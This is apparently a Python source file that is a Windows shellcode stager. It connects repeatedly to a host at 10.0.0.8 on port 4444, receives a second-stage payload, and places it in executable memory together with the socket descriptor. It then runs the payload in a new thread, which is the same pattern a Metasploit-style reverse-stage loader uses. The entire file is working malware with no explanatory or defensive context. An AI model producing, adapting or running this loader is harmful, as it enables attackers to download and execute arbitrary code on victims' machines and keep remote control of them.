import ctypes
import socket
import struct
import time
instruction = b"\x48\xbf"
def recv_sc(sc_len,sock):
	ret_len = 0
	shellcode = b''
	while True:
		print("[+]*****")
		ret_buf = sock.recv(sc_len)
		ret_len = len(ret_buf)
		shellcode += ret_buf
		sc_len -= ret_len
		if ret_len <= 0 and sc_len <= 0:
			break
	return shellcode
def start(host,port):
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	addr = (host,port)
	try:
		sock.connect(addr)
	except BaseException:
		sock.close()
		return 0
	sock_fd = sock.fileno()
	fd_buf = struct.pack("Q",sock_fd)
	#recv shellcode size
	buf = sock.recv(512)
	sc_szie = struct.unpack("i",buf)[0]
	#recv shellcode
	shellcode = recv_sc(sc_szie,sock)
	if len(shellcode) != sc_szie:
		print("recv stage2 failed! len:" + str(len(shellcode)))
		sock.close()
		return 0
	#Alloc shellcode space
	kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll")
	kernel32.VirtualAlloc.restype = ctypes.c_uint64
	sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(sc_szie + 10), 0x3000, 0x00000040)
	#copy instruction buf
	buf_arr = bytearray (instruction)
	buf_ptr = (ctypes.c_char * 2).from_buffer(buf_arr)
	kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(2))
	#copy socket fd
	buf_arr = bytearray (fd_buf)
	buf_ptr = (ctypes.c_char * 8).from_buffer(buf_arr)
	kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr + 2),buf_ptr,ctypes.c_int(8))
	#copy shellcode
	time.sleep(1)
	_ptr = ctypes.cast(shellcode,ctypes.c_char_p)
	kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr + 10),_ptr,ctypes.c_int(sc_szie))
	#run
	handle = kernel32.CreateThread(ctypes.c_int(0),
                               	   ctypes.c_int(0),
                                   ctypes.c_uint64(sc_ptr),
                                   ctypes.c_int(0),
                                   ctypes.c_int(0),
                                   ctypes.pointer(ctypes.c_int(0)))
	kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
	rst = kernel32.VirtualFree(ctypes.c_uint64(sc_ptr),ctypes.c_int(0),0x00008000)
	try:
		sock.close()
	except BaseException:
		pass
	return 1
if __name__ == "__main__":
	while True:
		print(" Reconnect! ")
		start("10.0.0.8",4444)
		time.sleep(3)